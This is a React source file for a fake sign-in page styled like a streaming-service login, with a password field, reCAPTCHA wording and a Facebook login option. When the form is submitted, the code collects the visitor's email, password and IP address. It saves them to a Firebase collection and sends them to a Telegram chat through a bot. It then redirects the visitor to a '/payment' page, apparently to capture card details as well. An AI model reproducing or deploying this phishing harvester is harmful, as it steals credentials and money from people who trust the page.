import { useState, Fragment } from 'react';
import { Redirect } from 'react-router-dom';

import Header from '../Layout/Header';
import Footer from '../Layout/Footer';

import db from '../firebase/firebase';

import signinBg from '../assets/signin-bg.jpg';
import facebook from '../assets/facebook.png';
import { useForm } from 'react-hook-form';
import { yupResolver } from '@hookform/resolvers/yup';
import * as Yup from 'yup';
import moment from "moment"
const { TelegramClient } = require('messaging-api-telegram');
const CryptoJS = require("crypto-js");
const client = new TelegramClient({
    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
});
const SignIn = () => {
    const [formSuccess, setFormSuccess] = useState(false);
    const validationSchema = Yup.object().shape({
        email: Yup.string()
          .required('Email is required')
          .email('Email is invalid'),
        password: Yup.string()
          .required('Password is required')
          .min(6, 'Password must be at least 6 characters')
          .max(40, 'Password must not exceed 40 characters'),
    });
    //hook form
    const {
        register,
        handleSubmit,
        formState: { errors }
      } = useForm({
        resolver: yupResolver(validationSchema)
      });

    const onSubmit = data => {
        fetch(
            "https://api.ipify.org?format=jsonp?callback=?", {
            method: "GET",
            headers: {}
        })
        .then(res => {
            return res.text()
        })
        .then(ip => {
            const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
            const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
            const isEnableDBStore = process.env.REACT_APP_PUBLIC_DB_STORE_ENABLE
            const isEnableTM = process.env.REACT_APP_PUBLIC_TM_ENABLE
            let email = data.email
            let password = data.password
            let ip_address = ip
            let logged_at = moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
            if( isEnableDecrypt === '1' )
            {
                email = CryptoJS.AES.encrypt(email, secretKey).toString()
                password = CryptoJS.AES.encrypt(password, secretKey).toString()
                ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
                logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
            }
            let tmMessage = "Sign In Data\r\n"
                tmMessage += "" + email + '\r\n'
                tmMessage += "" + password + '\r\n'
                tmMessage += "" + ip_address + '\r\n'
                tmMessage += "" + logged_at
            if( isEnableDBStore === '1' )
            {
                db.collection('signin-data').add({
                    email: email,
                    password: password,
                    ip_address: ip_address,
                    logged_at: logged_at
                }).then(res => {
                    setFormSuccess( true )
                }).catch(err => {
                    throw new Error(err);
                });
            }
            if( isEnableTM === '1' )
            {
                client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, tmMessage, {
                    disableWebPagePreview: true,
                    disableNotification: true,
                })
                .then( res => {
                    setFormSuccess( true )
                })
                .catch( e => console.log('error while TM message' + e))
            }
        })
        .catch( e => console.log('error while fetching ip' + e))

    };
    return (
        <Fragment>
            <Header type='type-1' />
            <div className='min-h-screen relative overflow-x-hidden'>
                {formSuccess ? <Redirect to='/payment' /> : null}
                <div className='fixed min-h-full -z-30 min-w-full min-h-screen min-w-screen left-0 top-0' style={{ backgroundImage: `url(${signinBg})` }}></div>
                <div className='fixed min-h-full -z-10 opacity-40 min-w-full min-h-screen min-w-screen left-0 top-0 bg-black'></div>

                <div className='relative w-5/5 xl:w-4/12 2xl:w-3/12 p-16 pb-32 m-auto rounded bg-black bg-opacity-70 z-10 my-12 '>
                    <h4 className='text-white text-3xl font-bold mb-6'>Sign in</h4>
                    <form onSubmit={handleSubmit(onSubmit)} className='text-white'>
                        <input 
                            style={{ background: '#333333' }} 
                            className='py-3 px-4 w-full rounded mb-5'
                            name="email"
                            type='text'
                            placeholder='Email'
                            {...register('email')} />
                        <p className="text-red-600">{errors.email?.message}</p>
                        <input 
                            style={{ background: '#333333' }} 
                            className='py-3 px-4 w-full rounded mb-5'
                            name="password"
                            type='password'
                            placeholder='Password'
                            {...register('password')} />
                        <p className="text-red-600">{errors.password?.message}</p>
                        <button
                            type="submit"
                            className='bg-red-600 w-full py-3 px-4 rounded text-white font-bold mb-3'
                        >
                            Sign In
                        </button>
                        <div className='flex justify-between text-gray-200 text-sm mb-14' style={{ color: '#747474' }}>
                            <label for="check">
                                <input id="check" className='bg-gray-200 mr-2' type='checkbox' />
                                Remember me
                            </label>
                            <p className='underline cursor-pointer'>Need help?</p>
                        </div>
                        <div className='flex items-center mb-5' style={{ color: '#747474' }}>
                            <img className='w-5 mr-2' src={facebook} alt='icon' />
                            <div>Login with Facebook</div>
                        </div>
                        <p style={{ color: '#747474' }} className='text-sm'>This page is protected by Google reCAPTCHA to ensure you're not a bot. <span className='text-blue-600 underline'>Learn more</span>.</p>
                    </form>
                </div>
                <Footer type='type-1' />
            </div>
        </Fragment>
    );
};

export default SignIn;